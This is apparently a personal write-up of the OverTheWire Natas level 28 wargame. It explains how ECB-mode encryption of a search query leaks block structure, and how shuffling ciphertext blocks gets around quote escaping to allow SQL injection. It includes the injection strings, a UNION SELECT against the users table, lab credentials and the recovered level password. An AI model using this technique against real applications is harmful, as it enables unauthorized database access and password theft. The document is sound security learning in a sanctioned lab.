# Overview
This is a tricky one, I didn't end up going far by myself so I turned to write-ups:
- https://axcheron.github.io/writeups/otw/natas/?ref=learnhacking.io#natas-28-solution
- https://learnhacking.io/overthewire-natas-level-28-walkthrough/
  - this one is more detailed, however it mostly copies the first one
  - plus it looks like it's somewhat inaccurate, so the first write-up is better

**Also here there is no source code.**
  
The webapp shows a single search box, when the search button is clicked a POST request is sent:
```
POST /index.php HTTP/1.1
Host: natas28.natas.labs.overthewire.org
Content-Length: 9
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyODpza3J3eGNpQWU2RG5iMFZmRkR6REVIY0N6UW12M0dkNA==
Upgrade-Insecure-Requests: 1
Origin: http://natas28.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas28.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

query=foo
```

Which returns the following response:
```
HTTP/1.1 302 Found
Date: Wed, 13 Mar 2024 03:48:24 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJGy6yL80k19W1kWa84GwVami4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
Content-Length: 920
Connection: close
Content-Type: text/html; charset=UTF-8

...
```

Then when following the redirect, search.php returns the list of jokes that match our query.

The key point here is the initial query string is transformed into a base64-encoded and encrypted blob, and we then query the app passing that blob. The next step in the write-up is to play with initial query string to see how it affects the blob.

# Understanding the ciphertext
In the first attempt (`play1.py`) we try multiple query strings of the form "", "a", "aa", "aaa", ...:
```
00 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
01 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
02 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKYsNYgsg1hFJebd+JNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
03 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ8EmoxKU1njKubmw7+RDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
04 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
05 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJLk0xdEarIh+MvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
06 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ+DZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
07 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKvwmKMYUAmbbaAruK1epuIZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
08 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLNQ6RxZsY7UPRe5yiycfUiiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
09 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d+oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
10 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
11 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyNjNpR93/Bz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo=
12 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyh1J9Q3czmMbvHxFKUToAKHX9UET9Bj0m9rt/c0tByJk=
13 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyxkduQZYZ04f0V3MSJfFf4WIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
14 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy8E3OxOtrwX6aLupZE7rN8kJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
15 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyBCVa4WFY0V3lE8rdLRyW4qdz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
16 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy4982HGOTYZrHs+nQl7ERrqd+jtGqvgtdBcT/5qwUI6tHjrGh/iYaLGwVBhEJs/7a
17 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzWmcbPL7fl9D3iEG3blOYr36EFTsaFFc+W8qVURZGUeQT0sqvywtdoaqcqUxUclw
18 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyp7SJW/f7tx3AmzQXc4/WeEh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
19 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhwCRNj7/kSX2mM0u1Qv9KJouK1228x8ZoU91Z46tqpBCSbk+TeoJCUeZlbnESzUa
20 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy5wrwtg4yc/S3kXfVkDZZTCkofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
21 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyzjyIMCFvQOsVmZpQmxtr8qw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
22 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyRi/s+IS1Qx9tuPPY1kKMAEHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
23 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyjlnHzG96QjknSLUwAU4SX2SGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O
24 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyhYFrQ+kyJH9pdrZDsBjKV4lt6QiE+GEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
25 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9WBUJHTJsGAxtf2jb2h6z6CVIvMBz502rHAj8WWUjFqXOc2QUi+nqG+VdztW+fjA
26 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK3OKX/tKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
27 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJKzYzaUfd/wc9EywiOR5lUQjKjPTmEJE6uuOaBnYZIEpa
28 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK4dSfUN3M5jG7x8RSlE6ACh1/VBE/QY9Jva7f3NLQciZ
29 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK8ZHbkGWGdOH9FdzEiXxX+FiI6FNnEKRuYd1sD+8c9Tt2K5R19pxsrCD2Rmg17iLmA==
30 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/BNzsTra8F+mi7qWRO6zfJCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==
31 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJKwQlWuFhWNFd5RPK3S0cluKnc/MYUJSqAUCPH5fQN9OFZ4xXc+zCj4cOT068bIBwpA==
32 chars: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK+PfNhxjk2Gax7Pp0JexEa6nfo7Rqr4LXQXE/+asFCOrR46xof4mGixsFQYRCbP+2g==
```

A few obvervations:
- the blob always start with the same string
- when the input string is 10 chars or longer, the pattern `JfIqcn9iVBmkZvmvU4kfmy` becomes fixed as well
- at the beginning the (base64-encoded) blob is made of (108 / 4 * 3) - 1 = 80 bytes
- when the input string is 13 chars or longer, it is made of (128 / 4 * 3) = 96 bytes
- when the input string is 30 chars or longer, it is made of (152 / 4 * 3) - 2 = 112 bytes

Based on this we can infer that our input string is inserted in the middle of a longer string, and that string is then encrypted by a cipher in [ECB mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#ECB) where the message is divided in blocks of 16 bytes, and then blocks are independently encrypted with the same key. 

One thing that puzzled in the write-up (https://axcheron.github.io/writeups/otw/natas/?ref=learnhacking.io#natas-28-solution) is that the author seems to imply that a 16-byte encrypted block contains 10 characters:

> Block 1 = “AAAAAAAAA’” (10 chars, last one is a single quote)
> Block 2 = “SQL Injection” (10 chars)
> Block x = “More SQL Injection” (10 chars)

My inital understanding was that a 16-byte plaintext is always encrypted to a 16-byte ciphertext. Turns out I am mostly correct, however the plaintext may be padded so that its total length is a multiple of 16, and the cipher text may then be a bit longer. Not sure I understand everything, it looks like it depends on the padding method used as well as block cipher mode of operation. Some good info here: https://stackoverflow.com/questions/3283787/size-of-data-after-aes-cbc-and-aes-ecb-encryption. But in the context of this CTF, we can safely assume that all 16-byte blocks of ciphertext contains 16 characters of plaintext.
 
Based on the above, we know that inserting 10 characters complete a 16-byte block. In that case the plaintext for that block consists of:
- 6 characters that we don't know
- 10 characters that we control

In the second attempt (`play2.py`) we attempt strings made of 9 "a" characters followed by a random letter:
```
char a: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIkA4mnOUKh8BvERzIoyMYtc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
char b: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKaJ+w3LEi9VL2x96EIV7z3c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
char c: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI1ZuexNCnLbVB/YkQXe5JOc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
...
```

It appears blocks at the beginning and the end remain identical, and the block that contains our injected string varies. In the third attempt (`play3.py`) we do the same thing but using punctuation:
```
char !: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPL89BFp1plW82MyjZBNJIYKc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
char ": G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5le0uzFQTQyTJF5uPUK3I8gMqM9OYQkTq645oGdhkgSlo=
char #: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJUdC72C0LUdS5k9uPenlQic4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
char $: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKfK+x7HXu9hEgwQtWQwtAsc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
char %: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIFsYeK8Y3JmD4ecRfI3d+c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
char &: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKQ/Gat6Y1BJbDyUq6czeNyc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
char ': G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lstdkbwCSkbjZzJR1FrozncqM9OYQkTq645oGdhkgSlo=
char (: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJvZsXaCHb7wsA+NGcWPxBrc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
...
```

This one is interesting, most of the times the block with our injected string varies. But sometimes the block has a fixed value, and then it's the subsequent block that varies. The reason, which I would have never figured out by myself :), is that some characters are escaped with a `\` character. So for instance the injected string `AAAAAAAAA'` becomes `AAAAAAAAA\'`.

# SQL Injection
Know that we understand the ciphertext, what can we do with it? The webapp returns a list of jokes that matches the initial `query` parameter. What is probably happening is that there is some SQL query to return the jokes, and that the initial request returns the full query but encrypted. Also that initial request escapes quotes characters that we would typically use to inject SQL statements. However, now that we understand how the ciphertext works we can switch or remove blocks to control the cleantext.

For instance we can use the following payload:
- 10 spaces
- 15 spaces followed with a `'` character
- then our inject SQL statement

The `index.php` endpoint will escape the payload and encrypt it, returning the following blocks:
- two starting blocks
- a block with 6 unknown characters followed by 10 spaces
- a block with 15 spaces followed with a `\` character
- a block starting with a `'` character, followed with the beginning of our SQL statement
- then more blocks... 

All we have to do is drop the ciphertext block with 15 spaces and `\`.

That's what I did in the `natas28.py` script:
```
./natas28.py 'OR 1=1' # returns all the jokes
./natas28.py 'UNION ALL SELECT password FROM users' # returns the password
```

And the password for next level is `31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`!
